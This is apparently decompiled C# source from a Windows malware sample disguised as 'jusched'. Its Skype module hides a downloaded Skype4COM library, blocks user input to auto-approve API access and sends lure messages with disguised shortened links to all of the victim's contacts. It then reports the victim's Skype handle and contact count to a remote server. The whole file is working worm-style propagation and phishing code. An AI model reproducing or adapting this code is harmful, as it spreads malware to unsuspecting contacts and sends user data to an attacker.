using System;
using System.Collections;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using jusched.My;

namespace jusched;

public class SkypeSP
{
	private const int SW_SHOWNORMAL = 1;

	private const int SW_MINIMIZE = 6;

	private const bool LOCKED = true;

	private const bool UNLOCKED = false;

	public static string pais = CultureInfo.CurrentUICulture.Name.Substring(3);

	public static System.Timers.Timer aTimer = new System.Timers.Timer();

	[DebuggerNonUserCode]
	public SkypeSP()
	{
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern long SetForegroundWindow(long hwnd);

	[DllImport("user32.dll")]
	private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("User32.dll")]
	private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindows);

	[DllImport("User32.dll")]
	private static extern int SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, StringBuilder lParam);

	[DllImport("User32.dll")]
	private static extern IntPtr SetFocus(IntPtr hWnd);

	[DllImport("User32.dll")]
	private static extern bool BlockInput(bool fBlockIt);

	[DllImport("user32.dll")]
	private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

	public static void skype_0()
	{
		aTimer.Elapsed += delegate
		{
			NICE();
		};
		aTimer.Interval = 10000.0;
		aTimer.Enabled = true;
	}

	public static void NICE()
	{
		string text = Environment.CurrentDirectory + "\\Skype4COM.dll";
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (!process.ProcessName.Contains("skype"))
			{
				continue;
			}
			try
			{
				if (!File.Exists(text))
				{
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://gskypeautoanswer.googlecode.com/svn-history/r1/trunk/Skype4COM-1.0.38.0/Skype4COM.dll", text);
					global_0.Registar_Dlls(text);
					File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		skype_attach();
		aTimer.Interval = 3600000.0;
	}

	public static void check()
	{
		Process[] processesByName = Process.GetProcessesByName("Skype");
		foreach (Process process in processesByName)
		{
			ShowWindow(process.MainWindowHandle, 1);
			ShowWindow(process.MainWindowHandle, 1);
		}
		IntPtr intPtr = FindWindowEx(FindWindow("tSkMainForm", null), IntPtr.Zero, "TZapCommunicator", null);
		if (!intPtr.Equals((object?)(nint)IntPtr.Zero))
		{
			SetForegroundWindow((long)intPtr);
			SetFocus(intPtr);
			BlockInput(fBlockIt: true);
			Thread.Sleep(500);
			SendKeys.SendWait("{tab}");
			Thread.Sleep(500);
			SendKeys.SendWait("+{tab}");
			Thread.Sleep(500);
			SendKeys.SendWait("{ENTER}");
			BlockInput(fBlockIt: false);
			Process[] processesByName2 = Process.GetProcessesByName("Skype");
			foreach (Process process2 in processesByName2)
			{
				ShowWindow(process2.MainWindowHandle, 6);
			}
			Thread.Sleep(10000);
			skype_msg();
		}
	}

	private static void skype_attach()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Skype4COM.skype", ""));
		object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
		object obj = objectValue2;
		NewLateBinding.LateCall(obj, (Type)null, "Attach", new object[2] { 7, false }, (string[])null, (Type[])null, (bool[])null, true);
		Thread.Sleep(8000);
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, (Type)null, "AttachmentStatus", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1, false))
		{
			check();
		}
		else
		{
			skype_msg();
		}
		obj = null;
	}

	private static void skype_cc()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Skype4COM.skype", ""));
		object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
		object obj = objectValue2;
		NewLateBinding.LateCall(obj, (Type)null, "ClearChatHistory", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		obj = null;
	}

	private static void skype_msg()
	{
		checked
		{
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Skype4COM.skype", ""));
				Random random = new Random();
				int num = 0;
				object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
				string[] array = new string[3] { "oye te acuerdas esta foto http://tiny.cc/tqwlmw?viaje_001.jpg ?", "que tal foto http://tiny.cc/zrwlmw?299912.jpg jajaja xD ", "suave con la foto de perfil ! http://tiny.cc/1swlmw?profile.jpg" };
				int num2 = random.Next(3);
				string text = array[num2];
				object obj = objectValue2;
				if (pais.Contains("ES"))
				{
					IEnumerator enumerator = default(IEnumerator);
					try
					{
						enumerator = ((IEnumerable)NewLateBinding.LateGet(obj, (Type)null, "Friends", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
						while (enumerator.MoveNext())
						{
							object objectValue3 = RuntimeHelpers.GetObjectValue(enumerator.Current);
							object obj2 = obj;
							object[] array2 = new object[2];
							object[] array3 = array2;
							object obj3 = objectValue3;
							array3[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj3, (Type)null, "handle", new object[0], (string[])null, (Type[])null, (bool[])null));
							array2[1] = text;
							object[] array4 = array2;
							object[] array5 = array4;
							bool[] array6 = new bool[2] { true, true };
							NewLateBinding.LateCall(obj2, (Type)null, "SendMessage", array5, (string[])null, (Type[])null, array6, true);
							if (array6[0])
							{
								NewLateBinding.LateSetComplex(obj3, (Type)null, "handle", new object[1] { RuntimeHelpers.GetObjectValue(array4[0]) }, (string[])null, (Type[])null, true, false);
							}
							if (array6[1])
							{
								text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[1]), typeof(string));
							}
							num++;
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				else if (pais.Contains("EN"))
				{
					IEnumerator enumerator2 = default(IEnumerator);
					try
					{
						enumerator2 = ((IEnumerable)NewLateBinding.LateGet(obj, (Type)null, "Friends", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
						while (enumerator2.MoveNext())
						{
							object objectValue4 = RuntimeHelpers.GetObjectValue(enumerator2.Current);
							object obj4 = obj;
							object[] array7 = new object[2];
							object[] array8 = array7;
							object obj3 = objectValue4;
							array8[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj3, (Type)null, "handle", new object[0], (string[])null, (Type[])null, (bool[])null));
							array7[1] = "Do you remeber ths pic http://goo.gl/7OZCD?pic=profile.jpg";
							object[] array4 = array7;
							object[] array9 = array4;
							bool[] array6 = new bool[2] { true, false };
							NewLateBinding.LateCall(obj4, (Type)null, "SendMessage", array9, (string[])null, (Type[])null, array6, true);
							if (array6[0])
							{
								NewLateBinding.LateSetComplex(obj3, (Type)null, "handle", new object[1] { RuntimeHelpers.GetObjectValue(array4[0]) }, (string[])null, (Type[])null, true, false);
							}
							num++;
						}
					}
					finally
					{
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
				}
				obj = null;
				string text2 = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "handle", new object[0], (string[])null, (Type[])null, (bool[])null));
				global_0.webget(Configuration.info + "?xxx=Skype " + num + " contacts From " + text2.ToString());
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
